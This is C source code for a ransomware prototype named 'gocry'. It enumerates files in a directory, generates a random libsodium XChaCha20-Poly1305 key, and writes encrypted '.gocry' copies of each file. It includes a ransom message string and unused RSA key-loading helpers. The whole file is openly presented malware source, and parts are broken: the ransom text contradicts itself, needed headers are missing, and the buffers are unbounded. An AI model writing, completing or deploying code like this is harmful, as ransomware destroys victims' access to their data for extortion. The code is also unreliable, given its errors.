#include <dirent.h>
#include <openssl/ossl_typ.h>
#include <openssl/rsa.h>
#include <sodium.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <stdio.h>
#include <string.h>

#define CHUNK_SIZE 4096

const char *root_dir_path = "./test";
const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";

EVP_PKEY *ReadPrivKey_FromFile(char *filename, char *pass) {
    FILE *fp = fopen(filename, "r");
    EVP_PKEY *key = NULL;
    PEM_read_PrivateKey(fp, &key, NULL, pass);
    fclose(fp);

    return key;
}

EVP_PKEY *ReadPubKey_FromFile(char *filename) {
    FILE *fp = fopen(filename, "r");
    EVP_PKEY *key = NULL;
    PEM_read_PUBKEY(fp, &key, NULL, NULL);
    fclose(fp);

    return key;
}

static int encrypt(const char *encrypt_to, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buffer_in[CHUNK_SIZE];
    unsigned char buffer_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(encrypt_to, "wb");
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key);
    fwrite(header, 1, sizeof header, fp_t);
    do {
        rlen = fread(buffer_in, 1, sizeof buffer_in, fp_s);
        eof = feof(fp_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        crypto_secretstream_xchacha20poly1305_push(&st, buffer_out, &out_len, buffer_in, rlen, NULL, 0, tag);
        fwrite(buffer_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    fclose(fp_t);
    fclose(fp_s);
    return 0;
}

static int decrypt(const char *to_encrypt, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buf_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char buf_out[CHUNK_SIZE];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    int ret = -1;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(to_encrypt, "wb");
    fread(header, 1, sizeof header, fp_s);
    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0) {
        goto ret;
    }
    do {
        rlen = fread(buf_in, 1, sizeof buf_in, fp_s);
        eof = feof(fp_s);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, buf_out, &out_len, &tag, buf_in, rlen, NULL, 0) !=
            0) {
            goto ret;
        }
        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            goto ret;
        }
        fwrite(buf_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    ret = 0;
ret:
    fclose(fp_t);
    fclose(fp_s);
    return ret;
}

int main() {
    // libsodium could not be initialized properly so don't run
    if (sodium_init() < 0)
        exit(1);

    DIR *root_dir = opendir(root_dir_path);
    struct dirent *dir;

    char *to_encrypt[512];
    int i = 0;

    if (root_dir) {
        while ((dir = readdir(root_dir)) != NULL) {
            if (!strcmp(dir->d_name, ".") || !strcmp(dir->d_name, "..")) {
                continue;
            }
            puts(dir->d_name);
            to_encrypt[i] = dir->d_name;
            ++i;
        }
        closedir(root_dir);
    }

    unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
    crypto_secretstream_xchacha20poly1305_keygen(encryption_key);
    for (int j = 0; j < i; ++j) {
        char filename[512] = {0};
        char original[512] = {0};

        strcpy(filename, root_dir_path);
        strcat(filename, "/");
        strcat(filename, to_encrypt[j]);
        strcat(filename, ".gocry");

        strcpy(original, root_dir_path);
        strcat(original, "/");
        strcat(original, to_encrypt[j]);

        if (encrypt(filename, original, encryption_key) != 0)
            printf("Error encrypting file %s", to_encrypt[j]);
    }
}
